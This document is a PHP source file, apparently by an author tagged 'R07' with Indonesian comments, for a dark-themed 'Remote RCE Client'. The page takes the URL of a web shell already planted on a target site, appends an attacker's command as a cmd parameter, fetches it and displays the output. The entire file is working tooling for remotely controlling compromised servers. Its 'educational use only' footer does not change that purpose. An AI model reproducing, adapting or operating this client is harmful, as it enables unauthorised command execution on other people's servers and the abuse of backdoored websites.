<?php
// Remote RCE Client - by R07
// Kirim perintah ke URL target (perl.alfa / rce.php / shell.php?cmd=...)

$output = '';
if (isset($_POST['target'], $_POST['cmd'])) {
    $target = trim($_POST['target']);
    $cmd = urlencode(trim($_POST['cmd']));

    // URL target + ?cmd=
    $url = rtrim($target, '/') . '?cmd=' . $cmd;

    // Ambil output dari target
    $response = @file_get_contents($url);
    $output = $response !== false ? $response : "❌ Gagal mengakses target atau tidak ada output.";
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>RCE Alfa Perl</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #121212;
      color: #f1f1f1;
      font-family: monospace;
    }
    .container {
      max-width: 700px;
      margin-top: 50px;
    }
    .terminal-box {
      background: #1e1e1e;
      border-radius: 10px;
      padding: 25px;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }
    .terminal-output {
      background: #000;
      color: #0f0;
      padding: 15px;
      border-radius: 5px;
      margin-top: 20px;
      white-space: pre-wrap;
      font-size: 14px;
    }
    .form-control, .btn {
      border-radius: 0;
    }
    .footer {
      text-align: center;
      font-size: 13px;
      color: #777;
      margin-top: 40px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="terminal-box">
      <h4 class="text-info">🛠️ Remote RCE Alfa</h4>
      <form method="POST" class="mb-3">
        <div class="mb-3">
          <input type="text" name="target" class="form-control" placeholder="URL target (contoh: http://site.com/perl.alfa)" required>
        </div>
        <div class="input-group">
          <input type="text" name="cmd" class="form-control" placeholder="Perintah (contoh: whoami)" required>
          <button class="btn btn-warning" type="submit">Eksekusi</button>
        </div>
      </form>

      <?php if ($output): ?>
      <div class="terminal-output">
        <?= htmlspecialchars($output) ?>
      </div>
      <?php endif; ?>
    </div>
    <div class="footer">© <?= date("Y") ?> RCE Client by R07 - For educational use only</div>
  </div>
</body>
</html>